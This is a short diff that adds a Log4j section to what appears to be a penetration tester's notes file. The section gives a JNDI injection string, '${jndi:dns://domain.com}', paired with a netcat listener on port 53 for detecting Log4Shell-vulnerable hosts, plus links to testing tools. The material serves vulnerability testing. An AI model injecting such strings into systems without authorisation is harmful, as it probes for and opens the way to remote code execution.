@@ -90,6 +90,17 @@ advanced regex:
 # Product specific
 
 # Java BS
+
+## Log4j
+
+Easy test for log4j dns lookups:
+```
+${jndi:dns://domain.com}
+nc -ulp 53
+```
+
+https://log4shell.tools/  
+https://github.com/alexbakker/log4shell-tools  
 ## JBOSS
 
 Common directories
